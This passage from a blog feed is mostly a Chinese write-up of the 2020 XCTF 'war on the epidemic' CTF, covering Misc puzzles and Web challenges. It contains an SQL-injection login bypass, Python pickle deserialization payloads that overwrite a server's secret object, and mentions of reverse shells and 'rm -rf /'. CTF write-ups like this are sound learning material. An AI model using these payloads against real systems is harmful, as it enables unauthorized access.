。</p><p>最后放了元素周期表……这脑洞真没想到。。</p><p>就是用元素周期表的元素去跑<code>xx.php</code>啦。<em>（难怪扫描器没用</em></p><h2 id="收个尾"><a href="#收个尾" class="headerlink" title="收个尾"></a>收个尾</h2><p>感觉这次 Crypto 和 Misc 题目本来就不怎么难，然而做起来感觉比较佛系，直接盲目上手，思路不大对，还懒。</p><p>有挺多套路没接触过的，脑洞还要大一点呢，后面有空再理一下做题的思路吧。</p><p>噢，官方 WP 也出来了，<a href="https://github.com/BjdsecCA/BJDCTF2020_March" target="_blank" rel="noopener">戳这里</a>吧。</p><p>嘤，还有一堆作业没补。</p><p>溜了溜了。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | XCTF高校战“疫”网络安全分享赛 WriteUp</title>
      <link href="/2020/03/15/CTF_2020XCTF_gxzy/"/>
      <url>/2020/03/15/CTF_2020XCTF_gxzy/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/03/15/CTF_2020XCTF_gxzy/poster.jpg" alt="poster"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上上周看到了这个 XCTF 的高校战“疫”网络安全分享赛，觉得有点意思可以玩一下。</p><p>于是上周末就水了一下，然而啥也不会菜到爆炸，都没几道题会做……<em>（后面还<del>补作业</del>瞎折腾去了</em></p><p>最近看了看大佬们的 WP，估计在他们眼里都是签到题吧，啥也不说直接丢一个 payload 搞定走人（awsl。</p><p>不过还是有点感受或者其他方面的收获之类的，顺便来学点东西，随便写一点吧。</p><p><strong>官方 WP：</strong> <a href="./gxzy-WP.pdf">点这里下载</a>   <em>（版权归官方所有）</em></p><blockquote><p>好像好多环境都关了。</p><p>（话说这篇文章丢 draft 里好久了唉，再不发就要长草了。</p></blockquote><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="2019-nCoV"><a href="#2019-nCoV" class="headerlink" title="2019-nCoV"></a>2019-nCoV</h3><p>真·签到</p><p><code>flag{shijiejiayou}</code></p><p>武汉加油！中国加油！世界加油！</p><br><h3 id="简单MISC"><a href="#简单MISC" class="headerlink" title="简单MISC"></a>简单MISC</h3><p>压缩包里有一个<code>flag.zip</code>（加密） 和一个<code>photo.jpg</code>（打不开）。 </p><p><code>photo.jpg</code> 经过提取得到一个zip文件。</p><p>里面有一个 <code>ctf.txt</code> 文件，里面是</p><pre><code>./.--./../-.././--/../-.-./.../../-/..-/.-/-/../---/-./---/..-./..-/-./../...-/./.-./.../../-/-.--/.--/.-/.-.</code></pre><p>一看是摩斯密码，解密得到</p><p><code>EPIDEMICSITUATIONOFUNIVERSITYWAR</code></p><p>（嗯 EPIDEMIC  SITUATION  OF  UNIVERSITY  WAR 嘛。高校战疫啦。</p><p>作为密码，解压<code>flag.zip</code>文件，得到<code>flag.txt</code></p><p><code>VGgxc19pc19GbGFHX3lvdV9hUkVfcmlnSFQ=</code></p><p>base64解密得到flag：</p><p><code>Th1s_is_FlaG_you_aRE_rigHT</code></p><br><h3 id="隐藏的信息"><a href="#隐藏的信息" class="headerlink" title="隐藏的信息"></a>隐藏的信息</h3><p>压缩包里有个<code>二维码.jpg</code>，以及 <code>纯数字.zip</code>。</p><p>其中压缩包加密了。</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/QRcode.jpg" alt="二维码"></p><p>发现二维码被扣掉了三个定位脚而且反色了，于是补全</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/QRcode2.jpg" alt="二维码_修复后"></p><p>扫码得到（可能补得不是很好，但发现手机 QQ 的扫码真的强</p><pre><code>flag{this_is_also_not_flag} 解压密码不在这里0.0！</code></pre><p>假的flag！发现并不能解压。</p><p>同时在十六进制编辑器里看到最后有一段字符串：<code>TOGETYOURFLAG</code>。<em>（有点懵，好像没啥用的亚子</em></p><p>再看回压缩包，根据文件名 <code>纯数字</code>，于是暴力跑了一波，然而并不行。</p><p>于是想到<strong>伪加密</strong>，果然如此。</p><p>解压得到<code>隐藏的信息.wav</code>，音频内容大概就是 <code>我的武汉尽快好起来</code> 之类的，挺应景的，也挺励志的。</p><p>在音频最后发现了比较微弱的<strong>拨号声音</strong>，看了看频域，发现了如下的频谱。（在最前面和最后面都有这样的信号）</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/spectrum.png" alt="spectrum"></p><p>每个拨号声由两个频率叠加而成。</p><p>想起来刚放寒假的时候有个学弟还问过拨号的原理，那时候还答不上来，查了半天没找到合适的资料。</p><p>这次再去谷歌查了一下，发现原来这叫做 <strong>DTMF 信号</strong>。</p><blockquote><p><strong><a href="https://zh.wikipedia.org/wiki/%E5%8F%8C%E9%9F%B3%E5%A4%9A%E9%A2%91" target="_blank" rel="noopener">双音多频信号</a>（Dual-Tone Multi-Frequency, DTMF）</strong>，电话系统中电话机与交换机之间的一种用户信令，最常用于发拨号时送被叫号码。</p><p>双音多频的拨号键盘是4×4的矩阵，每一行代表一个<em>高</em>频，每一列代表一个<em>低</em>频。每按一个键就发送一个<em>高</em>频和<em>低</em>频的正弦信号组合，比如’1’相当于697和1209赫兹（Hz）。交换机可以解码这些频率组合并确定所对应的按键。</p><p><em>（来自维基百科）</em></p></blockquote><table><thead><tr><th align="center"></th><th align="center">1209 Hz</th><th align="center">1336 Hz</th><th align="center">1477 Hz</th><th align="center">1633 Hz</th></tr></thead><tbody><tr><td align="center">697 Hz</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">A</td></tr><tr><td align="center">770 Hz</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">B</td></tr><tr><td align="center">852 Hz</td><td align="center">7</td><td align="center">8</td><td align="center">9</td><td align="center">C</td></tr><tr><td align="center">941 Hz</td><td align="center">*</td><td align="center">0</td><td align="center">#</td><td align="center">D</td></tr></tbody></table><p>本来想利用网络上在线的解码工具，然而发现网站不是上不去就是停止服务了。（噗</p><p>那还是自己来吧。</p><p>对于每一位号码分别查看频谱，根据最接近的低频和高频信号对应于表格内的数字/字母。（挺佩服直接就听出来的大佬</p><p>得到音频最后面这几个数字为 <code>5618521</code>，最前面的几个为 <code>18748</code>。</p><p>凑成 <code>flag{187485618521}</code> 交上去，不对！</p><p>难道两部分反了？于是倒过来再试，不行。</p><p>难道要倒叙？不行。</p><p>难道是字母？于是转成键盘上1-0对应着下面的一行字母，试了试，不行。</p><p>难道是哪个数字搞错了？？？再确认了一遍，队友也确认了一遍，就是这个啊（黑脸。</p><p>Base64 解码一下，不对不可能。</p><p>于是卡在这里了。</p><blockquote><p>看到别人 WP 的时候发现蠢死了，想到 base64 解码没想到反过来编码……</p><p>然而人家<code>二维码</code>里给提示了，只是提示不在结尾而已。</p><p>呐，<strong>USEBASE64TOGETYOURFLAG</strong>.</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/usebase64.png" alt="usebase64"></p><p>下次得先用 <code>strings</code> 来看看……</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/strings_base64.png" alt="strings"></p></blockquote><p>于是 flag 就是 <code>flag{MTg3NDg1NjE4NTIx}</code>。</p><hr><p>找资料的时候发现了有大佬在单片机上实现 DTMF 软解码的。</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/dtmf_soft.png" alt="单片机软解码"></p><p>在线生成某种特定音调的网站：<a href="http://onlinetonegenerator.com/dtmf.html" target="_blank" rel="noopener">http://onlinetonegenerator.com/dtmf.html</a></p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/toneGenerator.png" alt="toneGenerator"></p><p>其他一些资料：</p><p><a href="https://www.audiocheck.net/audiocheck_dtmf.php" target="_blank" rel="noopener">另一个在线 DTMF 生成工具 DTMF Tone Generator</a></p><p><a href="http://dialabc.com/sound/detect/" target="_blank" rel="noopener">一个在线 DTMF 解码工具 Detect DTMF Tones</a>（好像上不去）</p><p><a href="https://blog.csdn.net/hankhanti/article/details/49902441" target="_blank" rel="noopener">DTMF 编码及解码</a></p><p>GitHub项目：      </p><p><strong><a href="https://github.com/MeowLucian/DTMF_Detector" target="_blank" rel="noopener">DTMF_Detector</a></strong>  📞 Using Matlab to simulate Dual-Tone Multi-Frequency (DTMF) of telephone        </p><p><strong><a href="https://github.com/OmaymaS/DTMF-Detection-Goertzel-Algorithm-" target="_blank" rel="noopener">DTMF-Detection-Goertzel-Algorithm-</a></strong>  DTMF detection system developed on AVR Atmega128 board based on Goertzel algorithm        </p><br><hr><h3 id="武汉加油"><a href="#武汉加油" class="headerlink" title="武汉加油"></a>武汉加油</h3><p>发现附件只有一张图片↓。</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/1.jpg" alt=""></p><blockquote><p>首先祝武汉加油，中国加油，向医护人员致敬。</p></blockquote><p>发现了文件拼接了一个 RAR 文件，foremost 提取不出来，懒得开 Ubuntu 用 binwalk 了，于是直接手动提取出压缩包。</p><p>得到一个<code>flag.exe</code>.</p><p>什么？MISC 题还要 RE？？？</p><p>然而看了一下发现解不了，好像加壳了。</p><p>随便猜了一下和武汉加油相关的 flag 交上去，都不对……</p><p>看了大佬们的 WP 发现是 <code>flag{zhong_guo_jia_you}</code> … 中国加油！</p><p>（佩服直接猜出来的）</p><blockquote><p>原来图片里还隐写了密码，用 steghide 爆破提取出 <code>ﬂag.txt</code>，可以得到密码<code>' 武 汉 加 油 !</code>，输入到 <code>flag.exe</code>就可以得到 flag。（emmm</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/zhongguojiayou.png" alt="zhongguojiayou"></p></blockquote><br><h3 id="ez-mem-amp-usb"><a href="#ez-mem-amp-usb" class="headerlink" title="ez_mem&amp;usb"></a>ez_mem&amp;usb</h3><p>MISC 是真的杂……</p><p><code>captured.pcap</code>抓包文件，可以在一堆流量中提取出一个上传文件的页面<code>upload_file.php</code>。</p><p>从提交的 form 里可以提取出一个 <code>data.zip</code>.</p><p>压缩包里是一个 <code>data.vmem</code>，噫一个虚拟机内存镜像。</p><p>懵了，没玩过内存取证的题目唉<em>（好菜啊</em></p><p>看题目后面应该还需要提取 USB 的数据，大概 flag 在 USB 数据里吧。</p><p>后面有空再学学 volatility 内存取证。</p><br><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h3><blockquote><p><a href="http://121.37.161.79:8005" target="_blank" rel="noopener">http://121.37.161.79:8005</a></p></blockquote><p>就是输入<strong>用户名</strong>和<strong>密码</strong>登录那种，用 PHP 的 PDO 来连接数据库。用户名需要为<code>admin</code>。</p><p>毕竟是 checkin 题，感觉应该不会太难。然而试了试常用的万能密码发现并没有效果，都被 Deny 了。</p><p>然后队友在网上搜到了原题—— <a href="https://gksec.com/HNCTF2019-Final.html#toc-sqlsql" target="_blank" rel="noopener">湖南省第三届大学生信息安全水赛WriteUp</a>.</p><p><code>'-0-'</code>可以代替<code>'or'1</code>绕过。于是构造参数如下即可。</p><p><code>username=admin&amp;password='-0-'</code></p><blockquote><p>立个 flag，后面好好学一下 SQL（</p></blockquote><br><h3 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h3><blockquote><p><a href="http://121.36.222.22:10019/" target="_blank" rel="noopener">http://121.36.222.22:10019/</a></p></blockquote><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/webtmp.png" alt="webtmp"></p><p>源码：</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/webtmp_source.png" alt="source code"></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> pickle<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Animal</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> category<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>category <span class="token operator">=</span> category    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> f<span class="token string">'Animal(name={self.name!r}, category={self.category!r})'</span>    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> other<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> type<span class="token punctuation">(</span>other<span class="token punctuation">)</span> <span class="token keyword">is</span> Animal <span class="token operator">and</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name <span class="token operator">and</span> self<span class="token punctuation">.</span>category <span class="token operator">==</span> other<span class="token punctuation">.</span>category<span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">"global '%s.%s' is forbidden"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span>encoding<span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>        <span class="token keyword">return</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'source'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>read<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'text/plain'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            pickle_data <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> b<span class="token string">'R'</span> <span class="token keyword">in</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>pickle_data<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                result <span class="token operator">=</span> restricted_loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>pickle_data<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> type<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token operator">not</span> Animal<span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token string">'Are you sure that is an animal???'</span>            correct <span class="token operator">=</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> Animal<span class="token punctuation">(</span>secret<span class="token punctuation">.</span>name<span class="token punctuation">,</span> secret<span class="token punctuation">.</span>category<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'unpickle_result.html'</span><span class="token punctuation">,</span> result<span class="token operator">=</span>result<span class="token punctuation">,</span> pickle_data<span class="token operator">=</span>pickle_data<span class="token punctuation">,</span> giveflag<span class="token operator">=</span>correct<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>repr<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">"Something wrong"</span>    sample_obj <span class="token operator">=</span> Animal<span class="token punctuation">(</span><span class="token string">'mmm'</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>       pickle_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sample_obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'unpickle_page.html'</span><span class="token punctuation">,</span> sample_obj<span class="token operator">=</span>sample_obj<span class="token punctuation">,</span> pickle_data<span class="token operator">=</span>pickle_data<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span></code></pre><p><em>（可能有些地方被我不小心改了</em></p><p>看到 pickle 想到了反序列化，之前只听说过 PHP 有反序列化漏洞，这里才知道原来 python 也有。</p><p>这次正好就来了解一下 pickle 反序列化吧。</p><p><em>后面再记一下这一块的笔记吧（大概率咕咕咕</em></p><p>可以用 <strong>pickletools 这个反汇编工具</strong>来帮助理解 pickle 代码，即<code>opcode</code> 。</p><p>比如这里把<code>name</code>设成 <code>'mmm'</code>，<code>category</code>设为 <code>'aaaa'</code>，而后生成 pickle，可以看到各个命令的含义。</p><pre class=" language-bash"><code class="language-bash">$ python3 -m pickletools -a ./data    0: \x80 PROTO      3              Protocol version indicator.    2: c    GLOBAL     <span class="token string">'__main__ Animal'</span> Push a global object <span class="token punctuation">(</span>module.attr<span class="token punctuation">)</span> on the stack.   19: q    BINPUT     0                 Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   21: <span class="token punctuation">)</span>    EMPTY_TUPLE                  Push an empty tuple.   22: \x81 NEWOBJ                       Build an object instance.   23: q    BINPUT     1                 Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   25: <span class="token punctuation">}</span>    EMPTY_DICT                   Push an empty dict.   26: q    BINPUT     2                 Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   28: <span class="token punctuation">(</span>    MARK                         Push markobject onto the stack.   29: X        BINUNICODE <span class="token string">'name'</span>        Push a Python Unicode string object.   38: q        BINPUT     3             Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   40: X        BINUNICODE <span class="token string">'mmm'</span>         Push a Python Unicode string object.   48: q        BINPUT     4             Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   50: X        BINUNICODE <span class="token string">'category'</span>    Push a Python Unicode string object.   63: q        BINPUT     5             Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   65: X        BINUNICODE <span class="token string">'aaaa'</span>        Push a Python Unicode string object.   74: q        BINPUT     6             Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   76: u        SETITEMS   <span class="token punctuation">(</span>MARK at 28<span class="token punctuation">)</span>  Add an arbitrary number of key+value pairs to an existing dict.   77: b    BUILD                        Finish building an object, via __setstate__ or dict update.   78: <span class="token keyword">.</span>    STOP                         Stop the unpickling machine.highest protocol among opcodes <span class="token operator">=</span> 2</code></pre><p>看了半天反序列化漏洞，大部分都是<strong>利用<code>__reduce__</code>方法来实现任意代码的执行</strong>。</p><p>如果没有输出的话，可以反弹 shell 到自己的服务器上，利用网站访问日志来得到需要的信息。</p><p>（这时我看了看服务器的 nginx log，发现日常被扫，常见的 admin、phpmyadmin 目录，甚至还有想跨站执行 <code>rm -rf /</code> 的…… </p><p>话说回来，当我写好 <code>__reduce__</code> 方法 post 上去之后，发现被拒绝了。不过代码里也有体现。</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/webtmp_noRCE2.png" alt="no RCEs"></p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/webtmp_noRCE.png" alt="No RCE"></p><p>然而想要将 callable 对象执行都必须要调用 <code>reduce</code>，在 pickle 中都会涉及 <code>R</code> 这个字母。</p><p>于是乎不能在服务器上通过执行自己的代码来获取 flag。</p><p>后面突然想到，你不让我 RCE，我可以<strong>改掉你的 <code>secret</code> 中的 <code>name</code> 和 <code>category</code></strong> 啊！</p><p>这里要手搓 pickle 了。当时的思路是<strong>调用 <code>secret</code> 模块的内容对 Animal 进行实例化</strong>。然而比较菜，不知道为啥出了点问题。</p><p>后来又想到<strong>读取 secret 文件读取属性信息进而获取 flag</strong>，不过没有具体的思路，于是到这里就卡住了。</p><blockquote><p>后来看到大佬的 WP，发现果然是<strong>直接改掉这个<code>secret</code></strong>。</p><p>不过具体不是调用 <code>secret</code> 模块，而是直接在 <code>__main__</code> 下建一个自己的<code>secret</code>类，设置自己的属性，覆盖掉 import 进来的<code>secret</code>。再利用自己设置的属性信息去校验就完事了。</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> b<span class="token string">"\x80\x03c__main__\nsecret\n} (X\x04\x00\x00\x00nameX\x03\x00\x00\x00233X\x08\x00\x00\x00categoryX\x03\x00\x 00\x00233ub0c__main__\nAnimal\n)\x81} (X\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00233X\x08\x00\x00\x00categoryX\x03\ x00\x00\x00233ub."</span></code></pre><p>另一个 payload：</p><pre class=" language-python"><code class="language-python">b<span class="token string">"c__main__\nsecret\np0\n0g0\n(}(S'name'\nS'asd'\ndtbg0\n(}(S'category'\nS'123'\ndtb\x80\x04\x95=\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Animal\x94\x93\x94)\x81\x94}\x94(\x8c\x04name\x94\x8c\x03asd\x94\x8c\x08category\x94\x8c\x03123\x94ub."</span><span class="token comment" spellcheck="true"># base64</span>Y19fbWFpbl9fCnNlY3JldApwMAowZzAKKH0oUyduYW1lJwpTJ2FzZCcKZHRiZzAKKH0oUydjYXRlZ29yeScKUycxMjMnCmR0YoAElT0AAAAAAAAAjAhfX21haW5fX5SMBkFuaW1hbJSTlCmBlH2UKIwEbmFtZZSMA2FzZJSMCGNhdGVnb3J5lIwDMTIzlHViLg<span class="token operator">==</span></code></pre></blockquote><p><strong>下面这个链接里有关于 pickle 及其反序列化漏洞的更完整的介绍。</strong></p><p><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX#" target="_blank" rel="noopener"><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f40d.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f40d.png?v8">🐍</span> Security Issues in Python Pickle</a></p><p><em>（Scientific Network needed</em></p><blockquote><p>What is serialization, How to serialize data, Pickle in CTF Challenges, Implementation of Pickle, Vulnerabilities in Wild, Mitigation strategies &amp;&amp; Best practices…</p></blockquote><blockquote><p>里面讲到了几个例题</p><p><a href="http://web.hitctf.cn:10018/" target="_blank" rel="noopener">2019-SJTU-Pickle</a><br><a href="http://web.hitctf.cn:10018/" target="_blank" rel="noopener">2019-SJTU-Pickle-Revenge-Back</a><br><a href="http://web.hitctf.cn:10020/" target="_blank" rel="noopener">2018-HITB-Python-Revenge</a><br><a href="http://web.hitctf.cn:10019/" target="_blank" rel="noopener">2019-SJTU-Pickle-Revenge</a>   （←这个题就和这里这题几乎一个套路</p></blockquote><p>不允许<code>R</code>，他这里的注入思路也是调用 <code>secret</code> 模块的内容对 Animal 进行实例化，有点想不明白我写的哪里出问题了（</p><p>他还进一步实现了对文件的读取。最后的结论是，放弃使用<code>pickle</code>。毕竟太危险了呀！</p><blockquote><p><strong>Extensive Reading:</strong></p><ul><li><p><a href="https://zhuanlan.zhihu.com/p/25981037" target="_blank" rel="noopener">Python Pickle的任意代码执行漏洞实践和Payload构造</a></p></li><li><p><a href="http://blog.nsfocus.net/%e7%bb%95%e8%bf%87-restrictedunpickler/" target="_blank" rel="noopener">绕过 RestrictedUnpickler</a></p></li><li><p><a href="http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">Python反序列化漏洞的花式利用</a></p></li><li><p><a href="http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">关于Python sec的一些简单的总结</a></p></li></ul></blockquote><br><h2 id="Else"><a href="#Else" class="headerlink" title="Else"></a>Else</h2><p>其他的题大概看了看。。不过没什么思路或者有思路不知道怎么实现，好菜啊……</p><p>（怎么大佬们动不动随手就一个 payload 搞定了嘤嘤嘤</p><br><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>再回过头来看这次 CTF 的比赛名称，<strong>高校战“疫”网络安全分享赛</strong>。</p><p>还是挺有意思的吧。主题结合了当下的热点，题目也比较应景，也挺正能量的。</p><p>COVID-19 面前，不仅仅需要中国努力，更需要全世界一起行动起来，共同与疫情进行较量。</p><p>这是整个人类共同面临的困难和挑战，从中也更能意识到<strong>人类命运共同体</strong>的含义了。</p><p><strong>武汉加油，中国加油，世界加油！</strong></p><p>再看 CTF，感觉涉及的面不是一般的广，更多的是想来学点东西吧，你看人家大佬都比你厉害呢。</p><p>其中的 MISC 题经常需要不小的脑洞，比如 武汉加油、隐藏的信息 之类的题目就是呢。</p><p><strong>或许这就是CTF的魅力吧！</strong>  </p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/charms_of_CTF.png" alt="charms_of_CTF"></p><p>可能文中有的表述不大严谨，不要太在意（</p><p><del>这篇其实写的也很水</del></p><p>（溜</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | JetBrains Quest 3 WriteUp/攻略</title>
      <link href="/2020/03/14/CTF_2020JetBrainsQuest3/"/>
      <url>/2020/03/14/CTF_2020JetBrainsQuest3/</url>
      
